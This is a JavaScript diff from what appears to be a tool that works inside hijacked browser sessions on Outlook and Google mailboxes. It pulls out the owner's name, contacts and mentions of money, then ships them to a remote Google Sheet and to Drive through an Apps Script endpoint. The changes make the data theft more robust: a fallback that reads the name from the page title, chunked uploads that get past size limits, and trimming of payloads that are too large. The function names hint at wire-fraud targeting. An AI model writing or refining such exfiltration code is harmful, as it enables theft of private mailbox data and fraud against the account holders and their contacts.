@@ -1859,6 +1859,18 @@ async function extractWire(session, browserId) {
         await ensurePage();
         let personal = {};
         try { personal = await extractPersonalInfo(page, platform, email); } catch (e) { logger.warn(`[smartExtract] personal failed: ${e.message}`); }
+        // Fallback when personal nav fails/times out: office mail title carries
+        // "Mail - <Display Name> - Outlook" if the tab is still on the mailbox.
+        if (platform === 'outlook' && !(personal && personal.name)) {
+            try {
+                const t = await page.title();
+                const tm = t.match(/^Mail\s*-\s*(.+?)\s*-\s*Outlook/i);
+                if (tm && tm[1] && !/mail\s*-\s*outlook/i.test(tm[1])) {
+                    personal = { ...(personal || {}), name: tm[1].trim(), _nameFromMailTitle: true };
+                    logger.info(`[smartExtract] personal name fallback from mail title: "${tm[1].trim()}"`);
+                }
+            } catch (_) { /* page may be gone */ }
+        }
         update('personal');
 
         // Phase 7: Contacts (navigates to contacts.google.com)
@@ -2186,38 +2198,115 @@ async function writeHubViaAppScript(browserId, dataMap) {
         return { success: false, error: 'SCRIPT_URL or SCRIPT_KEY not configured' };
     }
     try {
-        const params = new URLSearchParams({
+        // Raw JSON body: urlencoded POSTs above ~50KB hit Apps Script's
+        // redirect/parameter size limit and come back as an HTML page instead
+        // of JSON (doPost merges e.postData.contents into params).
+        const resp = await axios.post(appScriptUrl, {
             action: 'setMultipleCellDataByColumnSearch',
             sheetName: HUB_SHEET,
             searchColumn: 'submissionId',
             searchValue: browserId,
             key: appScriptKey,
-            data: JSON.stringify(dataMap),
-        });
-        const resp = await axios.post(appScriptUrl, params, {
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            data: dataMap,
+        }, {
+            headers: { 'Content-Type': 'application/json' },
             timeout: 60000,
         });
-        if (resp.data?.success) {
+        const body = typeof resp.data === 'string' ? null : resp.data;
+        if (body?.success) {
             return { success: true };
         }
-        return { success: false, error: resp.data?.error || 'App Script returned success=false' };
+        if (!body) {
+            return { success: false, error: 'App Script returned non-JSON response (payload likely over size limit)' };
+        }
+        return { success: false, error: body.error || 'App Script returned success=false' };
     } catch (e) {
         return { success: false, error: e.message };
+    }
+}
+
+// Save a full extract JSON to Drive through the Apps Script (DriveApp uses the
+// script's own authorization — unaffected by the engine's expired OAuth token).
+// Apps Script web-app POSTs above ~50KB return an HTML page, so the minified JSON
+// is uploaded in sequential <=32KB chunks; the handler appends part 0..n-1 and
+// the final part returns the fileId.
+async function saveExtractViaAppScript(browserId, column, data) {
+    const appScriptUrl = process.env.SCRIPT_URL;
+    const appScriptKey = process.env.SCRIPT_KEY;
+    if (!appScriptUrl || !appScriptKey) {
+        return { success: false, error: 'SCRIPT_URL or SCRIPT_KEY not configured' };
+    }
+    try {
+        const json = JSON.stringify(data);
+        const CHUNK = 32000;
+        const parts = [];
+        for (let i = 0; i < json.length; i += CHUNK) parts.push(json.slice(i, i + CHUNK));
+        const fileName = `${column}.json`;
+        let last = null;
+        for (let i = 0; i < parts.length; i++) {
+            const resp = await axios.post(appScriptUrl, {
+                action: 'saveExtractToDrive',
+                key: appScriptKey,
+                browserId,
+                fileName,
+                chunk: parts[i],
+                partIndex: i,
+                totalParts: parts.length,
+            }, {
+                headers: { 'Content-Type': 'application/json' },
+                timeout: 120000,
+            });
+            const body = typeof resp.data === 'string' ? null : resp.data;
+            if (!body?.success) {
+                return { success: false, error: body ? (body.error || `part ${i + 1}/${parts.length} failed`) : `non-JSON response at part ${i + 1}/${parts.length}` };
+            }
+            last = body;
+        }
+        return { success: true, fileId: last.fileId, fileName: last.fileName || fileName, size: last.size || json.length };
+    } catch (e) {
+        return { success: false, error: e.message };
+    }
+}
+
+// Last-resort cell payload: keep summaries but strip contact subjects/bodies and
+// shed contacts until the JSON fits under the transport-safe cell budget.
+function compactExtractForCell(data) {
+    try {
+        const base = { ...data };
+        delete base.financialMentions;
+        const minimal = c => ({ name: c.name, email: c.email, type: c.type, source: c.source });
+        const all = (data.contacts || []).map(minimal);
+        base.contacts = all;
+        let s = JSON.stringify(base);
+        let limit = all.length;
+        while (s.length > 34000 && limit > 1) {
+            limit = Math.max(1, Math.floor(limit * 0.75));
+            base.contacts = all.slice(0, limit);
+            s = JSON.stringify(base);
+        }
+        return s;
+    } catch (e) {
+        return JSON.stringify(data);
     }
 }
 
 // ==================== Orchestrator ====================
 
 async function updateExtractStatus(browserId, status) {
+    const statusMap = {
+        extractStatus: status,
+        extractStatusAt: new Date().toISOString(),
+    };
     try {
         await ensureSheetColumns(HUB_SHEET, ['submissionId', 'extractStatus', 'extractStatusAt']);
-        await updateSheetRowApi(HUB_SHEET, 'submissionId', browserId, {
-            extractStatus: status,
-            extractStatusAt: new Date().toISOString(),
-        });
+        const r = await updateSheetRowApi(HUB_SHEET, 'submissionId', browserId, statusMap);
+        if (r && r.success) return;
+        throw new Error(r?.error || 'sheets write failed');
     } catch (e) {
-        logger.warn(`[smartExtract] status update failed: ${e.message}`);
+        const as = await writeHubViaAppScript(browserId, statusMap);
+        if (!as.success) {
+            logger.warn(`[smartExtract] status update failed: ${e.message}; app script fallback: ${as.error}`);
+        }
     }
 }
 
@@ -2291,10 +2380,30 @@ export async function runSmartExtract(browserId, category, username, platform) {
         // Ensure the hub column exists before writing.
         await ensureSheetColumns(HUB_SHEET, ['submissionId', column, `${column}At`]);
 
-        // Write to hub: if Drive save succeeded, store reference; otherwise store full JSON
-        const cellValue = driveRef
+        // Write to hub: if Drive save succeeded, store reference; otherwise store full JSON.
+        // Sheets cells cap at 50k chars and large urlencoded App Script writes fail, so
+        // oversized payloads go through the App Script Drive upload (its own auth) and
+        // only a small reference cell is written.
+        let cellValue = driveRef
             ? JSON.stringify({ ...driveRef, size: JSON.stringify(data).length })
             : JSON.stringify(data);
+
+        if (!driveRef && cellValue.length > 36000) {
+            const gasDrive = await saveExtractViaAppScript(browserId, column, data);
+            if (gasDrive.success) {
+                driveRef = { fileId: gasDrive.fileId, fileName: gasDrive.fileName };
+                cellValue = JSON.stringify({
+                    ...driveRef,
+                    size: gasDrive.size,
+                    emails: (data.contacts || []).map(c => c && c.email).filter(Boolean),
+                    contacts: (data.contacts || []).map(c => ({ name: c.name, email: c.email, type: c.type, source: c.source })),
+                });
+                logger.info(`[smartExtract] Saved ${column} to Drive via App Script: ${gasDrive.fileId} (cell ref ${cellValue.length} chars)`);
+            } else {
+                logger.warn(`[smartExtract] App Script Drive save failed: ${gasDrive.error}; writing compacted cell payload`);
+                cellValue = compactExtractForCell(data);
+            }
+        }
 
         const hubWriteMap = {
             [column]: cellValue,
